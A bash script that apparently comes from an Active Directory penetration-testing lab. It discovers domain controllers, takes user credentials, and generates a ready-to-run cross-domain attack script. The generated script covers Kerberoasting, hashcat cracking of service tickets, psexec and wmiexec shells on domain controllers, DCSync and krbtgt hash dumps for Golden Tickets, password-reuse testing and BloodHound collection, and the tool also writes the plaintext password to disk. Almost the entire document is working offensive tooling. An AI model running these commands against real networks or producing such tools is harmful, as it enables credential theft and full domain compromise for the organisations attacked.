#!/bin/bash
# Phase 2: Complete Cross-Domain Attack Command Generator

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

show_banner() {
    echo -e "${BLUE}"
    cat << "EOF"
    ____  __                       ___          ______
   / __ \/ /_  ____ _________     |__ \        / ____/______  __________
  / /_/ / __ \/ __ `/ ___/ _ \    __/ /       / /   / ___/ / / / ___/ _ \
 / ____/ / / / /_/ (__  )  __/   / __/       / /___/ /  / /_/ (__  )  __/
/_/   /_/ /_/\__,_/____/\___/   /____/       \____/_/   \__,_/____/\___/
EOF
    echo -e "${NC}"
    echo -e "${CYAN}Complete Cross-Domain Attack Command Generator${NC}\n"
}

show_banner

# Load Phase 1
if [[ ! -f "ad_target.conf" ]]; then
    echo -e "${RED}[!] Error: ad_target.conf not found. Run Phase 1 first.${NC}"
    exit 1
fi

source ad_target.conf

# Discover all domains
echo -e "${BLUE}[*] Reading Phase 1 discovery...${NC}\n"

declare -a ALL_DISCOVERED_DOMAINS
declare -a ALL_DISCOVERED_DC_NAMES
declare -a ALL_DISCOVERED_DC_IPS

ALL_DISCOVERED_DOMAINS+=("$DOMAIN")
ALL_DISCOVERED_DC_NAMES+=("$DC_NAME")
ALL_DISCOVERED_DC_IPS+=("$DC_IP")

echo -e "${GREEN}[+] Discovered from Phase 1:${NC}"
echo -e "    ${YELLOW}$DOMAIN${NC} - $DC_NAME ($DC_IP)"

# Quick scan for additional DCs
if command -v nmap &> /dev/null && [[ -n "$DC_IP" ]]; then
    NETWORK=$(echo $DC_IP | cut -d'.' -f1-3).0/24
    echo -e "\n${BLUE}[*] Scanning for additional DCs on $NETWORK...${NC}"
    
    other_dcs=$(sudo nmap -p 389 --open $NETWORK -oG - 2>/dev/null | awk '/389\/open/{print $2}' | grep -v "$DC_IP")
    
    for other_dc_ip in $other_dcs; do
        other_domain=$(ldapsearch -x -H ldap://$other_dc_ip -b "" -s base defaultNamingContext 2>/dev/null | \
                      grep "defaultNamingContext:" | head -1 | sed 's/defaultNamingContext: //' | \
                      sed 's/DC=//g' | sed 's/,/./g')
        
        if [[ ! -z "$other_domain" ]] && [[ "$other_domain" != "$DOMAIN" ]]; then
            other_dc_name=$(ldapsearch -x -H ldap://$other_dc_ip -b "" -s base dnsHostName 2>/dev/null | \
                           grep "dnsHostName:" | awk '{print $2}')
            
            ALL_DISCOVERED_DOMAINS+=("$other_domain")
            ALL_DISCOVERED_DC_NAMES+=("$other_dc_name")
            ALL_DISCOVERED_DC_IPS+=("$other_dc_ip")
            
            echo -e "    ${YELLOW}$other_domain${NC} - $other_dc_name ($other_dc_ip)"
        fi
    done
fi

echo ""

# Get credentials
echo -e "${YELLOW}[?] Enter your credentials:${NC}"
read -p "Username: " CRED_USER
read -sp "Password: " CRED_PASS
echo ""

# Select source domain
echo -e "\n${YELLOW}[?] Which domain do your credentials belong to?${NC}"
for i in "${!ALL_DISCOVERED_DOMAINS[@]}"; do
    echo -e "  [$((i+1))] ${ALL_DISCOVERED_DOMAINS[$i]}"
done

read -p "Choice: " source_choice
idx=$((source_choice-1))
SOURCE_DOMAIN="${ALL_DISCOVERED_DOMAINS[$idx]}"
SOURCE_DC_NAME="${ALL_DISCOVERED_DC_NAMES[$idx]}"
SOURCE_DC_IP="${ALL_DISCOVERED_DC_IPS[$idx]}"

# Select targets
echo -e "\n${YELLOW}[?] Select TARGET domains to attack:${NC}"
declare -a SELECTED_TARGETS
declare -a SELECTED_TARGET_DCS
declare -a SELECTED_TARGET_IPS

target_counter=1
declare -A target_map
for i in "${!ALL_DISCOVERED_DOMAINS[@]}"; do
    if [[ "${ALL_DISCOVERED_DOMAINS[$i]}" != "$SOURCE_DOMAIN" ]]; then
        echo -e "  [$target_counter] ${ALL_DISCOVERED_DOMAINS[$i]}"
        target_map[$target_counter]=$i
        target_counter=$((target_counter+1))
    fi
done
echo -e "  [A] Attack ALL other domains"

read -p "Choice: " target_selection

if [[ "$target_selection" == "A" ]] || [[ "$target_selection" == "a" ]]; then
    for i in "${!ALL_DISCOVERED_DOMAINS[@]}"; do
        if [[ "${ALL_DISCOVERED_DOMAINS[$i]}" != "$SOURCE_DOMAIN" ]]; then
            SELECTED_TARGETS+=("${ALL_DISCOVERED_DOMAINS[$i]}")
            SELECTED_TARGET_DCS+=("${ALL_DISCOVERED_DC_NAMES[$i]}")
            SELECTED_TARGET_IPS+=("${ALL_DISCOVERED_DC_IPS[$i]}")
        fi
    done
else
    idx=${target_map[$target_selection]}
    SELECTED_TARGETS+=("${ALL_DISCOVERED_DOMAINS[$idx]}")
    SELECTED_TARGET_DCS+=("${ALL_DISCOVERED_DC_NAMES[$idx]}")
    SELECTED_TARGET_IPS+=("${ALL_DISCOVERED_DC_IPS[$idx]}")
fi

# Summary
echo -e "\n${BLUE}=== Attack Plan ===${NC}"
echo -e "${GREEN}Source:${NC} $SOURCE_DOMAIN"
echo -e "${GREEN}Targets:${NC} ${SELECTED_TARGETS[*]}"
echo ""

# Generate commands
OUTPUT_DIR="phase2_output_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"
OUTPUT_FILE="$OUTPUT_DIR/attack_commands.sh"

echo -e "${YELLOW}[*] Generating complete attack commands...${NC}\n"

{
    echo "#!/bin/bash"
    echo "# ============================================================================"
    echo "# Complete Cross-Domain Attack Commands"
    echo "# Generated: $(date)"
    echo "# ============================================================================"
    echo ""
    echo "# SOURCE: $SOURCE_DOMAIN"
    echo "# USER: $CRED_USER"
    echo "# PASS: $CRED_PASS"
    echo ""
    
    for i in "${!SELECTED_TARGETS[@]}"; do
        target_domain="${SELECTED_TARGETS[$i]}"
        target_dc_name="${SELECTED_TARGET_DCS[$i]}"
        target_dc_ip="${SELECTED_TARGET_IPS[$i]}"
        target_short=$(echo "$target_domain" | cut -d'.' -f1 | tr '[:upper:]' '[:lower:]')
        
        echo ""
        echo "################################################################################"
        echo "# TARGET: $target_domain"
        echo "################################################################################"
        echo ""
        
        echo "# ============================================================================"
        echo "# PHASE 1: RECONNAISSANCE & KERBEROASTING"
        echo "# ============================================================================"
        echo ""
        
        echo "# Step 1: Enumerate all SPNs in target domain"
        echo "GetUserSPNs.py -target-domain $target_domain $SOURCE_DOMAIN/$CRED_USER"
        echo "#   This shows all kerberoastable accounts (e.g., mssqlsvc, sapsso)"
        echo ""
        
        echo "# Step 2: Request TGS tickets for all SPNs"
        echo "GetUserSPNs.py -request -target-domain $target_domain $SOURCE_DOMAIN/$CRED_USER"
        echo ""
        
        echo "# Step 3: Save TGS tickets to file for offline cracking"
        echo "GetUserSPNs.py -request -outputfile ${target_short}_tgs.txt -target-domain $target_domain $SOURCE_DOMAIN/$CRED_USER"
        echo ""
        
        echo "# Step 4: Crack TGS tickets with Hashcat (mode 13100)"
        echo "hashcat -m 13100 ${target_short}_tgs.txt /usr/share/wordlists/rockyou.txt"
        echo ""
        
        echo "# Step 5: Show cracked passwords"
        echo "hashcat -m 13100 ${target_short}_tgs.txt /usr/share/wordlists/rockyou.txt --show"
        echo ""
        
        echo ""
        echo "# ============================================================================"
        echo "# PHASE 2: EXPLOITATION (After cracking credentials)"
        echo "# ============================================================================"
        echo ""
        
        echo "# Replace <CRACKED_USER> and <CRACKED_PASS> with actual cracked credentials"
        echo ""
        
        echo "# Step 6: Test cracked credentials with CME"
        echo "crackmapexec smb $target_dc_ip -u <CRACKED_USER> -p '<CRACKED_PASS>' -d $target_domain"
        echo ""
        
        echo "# Step 7: Get shell on target DC with psexec"
        echo "psexec.py $target_domain/<CRACKED_USER>:'<CRACKED_PASS>'@$target_dc_name"
        echo "#   Once in shell: type C:\\Users\\Administrator\\Desktop\\flag.txt"
        echo ""
        
        echo "# Step 8: Alternative - Get shell with wmiexec"
        echo "wmiexec.py $target_domain/<CRACKED_USER>:'<CRACKED_PASS>'@$target_dc_name"
        echo "#   Once in shell: type C:\\Users\\Administrator\\Desktop\\flag.txt"
        echo ""
        
        echo "# Step 9: Dump domain credentials (DCSync)"
        echo "secretsdump.py '$target_domain/<CRACKED_USER>:<CRACKED_PASS>@$target_dc_ip'"
        echo ""
        
        echo "# Step 10: Dump only NTDS.dit (all hashes)"
        echo "secretsdump.py '$target_domain/<CRACKED_USER>:<CRACKED_PASS>@$target_dc_ip' -just-dc-ntlm"
        echo ""
        
        echo "# Step 11: Dump krbtgt for Golden Ticket"
        target_short_upper=$(echo "$target_short" | tr '[:lower:]' '[:upper:]')
        echo "secretsdump.py '$target_domain/<CRACKED_USER>:<CRACKED_PASS>@$target_dc_ip' -just-dc-user $target_short_upper/krbtgt"
        echo ""
        
        echo ""
        echo "# ============================================================================"
        echo "# PHASE 3: PASSWORD REUSE TESTING"
        echo "# ============================================================================"
        echo ""
        
        echo "# Test if cracked account exists in source domain with same password"
        echo ""
        
        echo "# Check DNS resolution for source domain"
        echo "nslookup $SOURCE_DC_NAME"
        echo ""
        
        echo "# Test password reuse in source domain"
        echo "crackmapexec smb $SOURCE_DC_IP -u <CRACKED_USER> -p '<CRACKED_PASS>' -d $SOURCE_DOMAIN"
        echo ""
        
        echo "# If password reuse found, try to get shell"
        echo "psexec.py $SOURCE_DOMAIN/<CRACKED_USER>:'<CRACKED_PASS>'@$SOURCE_DC_NAME"
        echo ""
        
        echo ""
        echo "# ============================================================================"
        echo "# PHASE 4: ENUMERATE SPECIFIC SPNs"
        echo "# ============================================================================"
        echo ""
        
        echo "# Request TGS for specific user (e.g., sapsso)"
        echo "GetUserSPNs.py -target-domain $target_domain -request -user sapsso $SOURCE_DOMAIN/$CRED_USER"
        echo ""
        
        echo "# Request TGS for specific user (e.g., mssqlsvc)"
        echo "GetUserSPNs.py -target-domain $target_domain -request -user mssqlsvc $SOURCE_DOMAIN/$CRED_USER"
        echo ""
        
    done
    
    echo ""
    echo "################################################################################"
    echo "# BLOODHOUND DATA COLLECTION (All Domains)"
    echo "################################################################################"
    echo ""
    
    echo "# ============================================================================"
    echo "# Collect from SOURCE domain: $SOURCE_DOMAIN"
    echo "# ============================================================================"
    echo ""
    
    echo "# Configure DNS for source domain"
    echo "echo -e \"domain $SOURCE_DOMAIN\\nnameserver $SOURCE_DC_IP\" | sudo tee /etc/resolv.conf"
    echo ""
    
    source_dc_short=$(echo "$SOURCE_DC_NAME" | cut -d'.' -f1)
    echo "# Collect BloodHound data"
    echo "bloodhound-python -d $SOURCE_DOMAIN -dc $source_dc_short -c All -u $CRED_USER -p '$CRED_PASS'"
    echo ""
    
    for i in "${!SELECTED_TARGETS[@]}"; do
        target_domain="${SELECTED_TARGETS[$i]}"
        target_dc_name="${SELECTED_TARGET_DCS[$i]}"
        target_dc_ip="${SELECTED_TARGET_IPS[$i]}"
        
        echo ""
        echo "# ============================================================================"
        echo "# Collect from TARGET domain: $target_domain"
        echo "# ============================================================================"
        echo ""
        
        echo "# Configure DNS for target domain"
        echo "echo -e \"domain $target_domain\\nnameserver $target_dc_ip\" | sudo tee /etc/resolv.conf"
        echo ""
        
        source_lower=$(echo "$SOURCE_DOMAIN" | tr '[:upper:]' '[:lower:]')
        echo "# Collect BloodHound data (cross-domain authentication)"
        echo "bloodhound-python -d $target_domain -dc $target_dc_name -c All -u $CRED_USER@$source_lower -p '$CRED_PASS'"
        echo ""
    done
    
    echo ""
    echo "# Compress all JSON files for BloodHound upload"
    echo "zip -r bloodhound_all_$(date +%Y%m%d_%H%M%S).zip *.json"
    echo ""
    
    echo ""
    echo "################################################################################"
    echo "# ADDITIONAL ENUMERATION"
    echo "################################################################################"
    echo ""
    
    for i in "${!SELECTED_TARGETS[@]}"; do
        target_domain="${SELECTED_TARGETS[$i]}"
        target_dc_ip="${SELECTED_TARGET_IPS[$i]}"
        
        echo "# ============================================================================"
        echo "# Domain: $target_domain"
        echo "# ============================================================================"
        echo ""
        
        source_lower=$(echo "$SOURCE_DOMAIN" | tr '[:upper:]' '[:lower:]')
        
        echo "# Enumerate all users"
        echo "GetADUsers.py -all $target_domain/$CRED_USER@$source_lower -dc-ip $target_dc_ip"
        echo ""
        
        echo "# Enumerate Domain Admins"
        echo "net rpc group members 'Domain Admins' -I $target_dc_ip -U '$target_domain\\$CRED_USER%$CRED_PASS'"
        echo ""
        
        echo "# Check password policy"
        echo "crackmapexec smb $target_dc_ip -u $CRED_USER@$SOURCE_DOMAIN -p '$CRED_PASS' -d $target_domain --pass-pol"
        echo ""
        
        echo "# Enumerate computers"
        echo "crackmapexec smb $target_dc_ip -u $CRED_USER@$SOURCE_DOMAIN -p '$CRED_PASS' -d $target_domain --computers"
        echo ""
    done
    
    echo ""
    echo "################################################################################"
    echo "# EXAMPLE WORKFLOW (Replace placeholders with actual values)"
    echo "################################################################################"
    echo ""
    echo "# 1. Run Kerberoasting"
    echo "#    GetUserSPNs.py -request -target-domain TARGET_DOMAIN SOURCE_DOMAIN/wley"
    echo ""
    echo "# 2. Crack with Hashcat"
    echo "#    hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt --show"
    echo "#    Output: mssqlsvc:1logistics"
    echo ""
    echo "# 3. Get shell on target DC"
    echo "#    psexec.py FREIGHTLOGISTICS.LOCAL/mssqlsvc:'1logistics'@ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL"
    echo ""
    echo "# 4. Get flag"
    echo "#    type C:\\Users\\Administrator\\Desktop\\flag.txt"
    echo ""
    echo "# 5. Test password reuse"
    echo "#    crackmapexec smb 172.16.5.5 -u mssqlsvc -p '1logistics'"
    echo ""
    
    echo "################################################################################"
    echo "# END OF COMMANDS"
    echo "################################################################################"
    
} | tee "$OUTPUT_FILE"

chmod +x "$OUTPUT_FILE"

# Create quick reference
cat > "$OUTPUT_DIR/quick_reference.txt" << EOF
Attack Command Reference
========================
Generated: $(date)

Source Domain: $SOURCE_DOMAIN
  User: $CRED_USER
  Pass: $CRED_PASS
  DC: $SOURCE_DC_NAME ($SOURCE_DC_IP)

Target Domains:
EOF

for i in "${!SELECTED_TARGETS[@]}"; do
    echo "  ${SELECTED_TARGETS[$i]}" >> "$OUTPUT_DIR/quick_reference.txt"
    echo "    DC: ${SELECTED_TARGET_DCS[$i]} (${SELECTED_TARGET_IPS[$i]})" >> "$OUTPUT_DIR/quick_reference.txt"
done

cat >> "$OUTPUT_DIR/quick_reference.txt" << EOF

Common Commands:
  Kerberoast: GetUserSPNs.py -request -target-domain TARGET $SOURCE_DOMAIN/$CRED_USER
  Crack: hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
  Shell: psexec.py DOMAIN/user:'pass'@DC
  Dump: secretsdump.py 'DOMAIN/user:pass@DC'
EOF

echo -e "\n${GREEN}[+] Complete attack commands saved to: ${YELLOW}$OUTPUT_FILE${NC}"
echo -e "${GREEN}[+] Quick reference: ${YELLOW}$OUTPUT_DIR/quick_reference.txt${NC}\n"

echo -e "${CYAN}[!] Key Attack Phases:${NC}"
echo -e "  ${MAGENTA}1.${NC} Kerberoast → Crack TGS tickets"
echo -e "  ${MAGENTA}2.${NC} Exploit → Get shell with cracked creds"
echo -e "  ${MAGENTA}3.${NC} Test password reuse across domains"
echo -e "  ${MAGENTA}4.${NC} BloodHound → Find foreign group memberships"
echo ""
